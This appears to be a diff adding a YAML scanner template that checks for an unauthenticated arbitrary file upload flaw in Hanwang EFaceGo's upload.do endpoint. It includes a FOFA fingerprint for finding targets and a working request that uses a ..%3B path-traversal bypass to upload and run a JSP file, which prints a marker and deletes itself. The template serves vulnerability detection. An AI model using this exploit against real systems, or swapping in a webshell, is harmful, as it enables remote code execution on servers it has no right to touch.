@@ -1,0 +1,43 @@
+id: hanwang-efacego-upload-do-fileupload
+
+info:
+  name: 汉王EFaceGo upload.do 任意文件上传漏洞
+  author: Superhero
+  severity: critical
+  description: |-
+    fofa: icon_hash="1380907357"
+    汉王EFaceGo upload.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/pj5IiQZAy_K1QhhHLuShbw
+  tags: hanwang,fileupload
+  created: 2025/07/08
+
+set:
+  username: randomLowercase(6)
+  rboundary: randomLowercase(8)
+  randombody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |-
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("{{randombody}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+    output:
+      search: '"(?P<uploadfile>upload/[a-zA-Z0-9-]+\\.jsp)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+  r1:
+    request:
+      method: GET
+      path: /manage/operation/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randombody))
+expression: r0() && r1()
